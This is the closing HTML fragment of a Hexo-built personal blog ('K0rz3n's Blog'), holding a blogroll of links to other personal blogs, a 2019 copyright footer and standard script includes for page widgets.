href="http://blog.cal1.cn/" title="超威蓝猫" target="_blank">超威蓝猫</a><ul></ul><a href="https://ricterz.me" title="RicterZ" target="_blank">RicterZ</a><ul></ul><a href="https://cyto.top/" title="Cytosine" target="_blank">Cytosine</a><ul></ul><a href="http://foreversong.cn/" title="ADog" target="_blank">ADog</a><ul></ul><a href="http://www.ckj123.com/" title="cjk123" target="_blank">cjk123</a><ul></ul><a href="http://arch0n.sumblog.cn" title="August" target="_blank">August</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2019 <a href="/." rel="nofollow">K0rz3n's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div></body></html>
